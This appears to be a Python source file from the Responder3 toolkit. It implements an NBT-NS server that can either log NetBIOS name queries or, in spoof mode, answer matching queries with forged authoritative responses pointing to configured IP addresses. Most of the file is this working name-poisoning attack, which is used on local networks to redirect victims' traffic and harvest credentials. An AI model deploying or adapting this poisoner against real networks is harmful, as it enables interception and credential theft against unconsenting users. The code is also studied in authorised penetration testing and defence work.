import os
import copy
import logging
import traceback
import socket
import enum
import traceback
import ipaddress
import re

from responder3.newpackets.NetBIOS import * 
from responder3.servers.BASE import ResponderServer, ResponderProtocolUDP, ProtocolSession, PoisonerMode

class NBTNSSession(ProtocolSession):
	def __init__(self, server):
		ProtocolSession.__init__(self, server)

class NBTNS(ResponderServer):
	def __init__(self):
		ResponderServer.__init__(self)

	def modulename(self):
		return 'NBTS'

	def setup(self):
		self.protocol = NBTNSProtocol
		self.spoofTable = []
		if self.settings is None:
			self.log(logging.INFO, 'No settings defined, adjusting to Analysis functionality!')
			self.settings = {}
			self.settings['mode'] = PoisonerMode.ANALYSE

		else:
			#parse the poisoner mode
			if isinstance(self.settings['mode'], str):
				self.settings['mode'] = PoisonerMode[self.settings['mode'].upper()]

			#compiling re strings to actual re objects and converting IP strings to IP objects
			if self.settings['mode'] == PoisonerMode.SPOOF:
				print('1')
				for exp in self.settings['spoofTable']:
					if exp == 'ALL':
						self.spoofTable.append((re.compile('.*'),ipaddress.ip_address(self.settings['spoofTable'][exp])))
						continue
					self.spoofTable.append((re.compile(exp),ipaddress.ip_address(self.settings['spoofTable'][exp])))



	def handle(self, packet, addr, transport, session):
		if 'R3DEEPDEBUG' in os.environ:
				self.log(logging.INFO,'Packet: %s' % (repr(packet),), session)
			
		try:
			if self.settings['mode'] == PoisonerMode.ANALYSE:
				for q in packet.Questions:
					self.logPoisonResult(session, requestName = q.QNAME)

			else: #poisoning
				answers = []
				for targetRE, ip in self.spoofTable:
					for q in packet.Questions:
						if targetRE.match(q.QNAME):
							self.logPoisonResult(session, requestName = q.QNAME, poisonName = str(targetRE), poisonIP = ip)
							res = NBResource()
							res.construct(q.QNAME, NBRType.NB, ip)
							answers.append(res)
				
				response = NBTNSPacket()
				response.construct(TID = packet.NAME_TRN_ID, 
					 response = NBTSResponse.RESPONSE, 
					 opcode = NBTNSOpcode.QUERY, 
					 nmflags = NBTSNMFlags.AUTHORATIVEANSWER | NBTSNMFlags.RECURSIONDESIRED, 
					 answers= answers)

				transport.sendto(response.toBytes(), addr)

			self.log(logging.DEBUG,'Sending response!')
		except Exception as e:
			traceback.print_exc()
			self.log(logging.INFO,'Exception! %s' % (str(e),))
			pass
		


class NBTNSProtocol(ResponderProtocolUDP):
	
	def __init__(self, server):
		ResponderProtocolUDP.__init__(self, server)
		self._session = NBTNSSession(server.rdnsd)

	def _parsebuff(self, addr):
		packet = NBTNSPacket.from_bytes(self._buffer)
		self._server.handle(packet, addr, self._transport, self._session)
		self._buffer = b''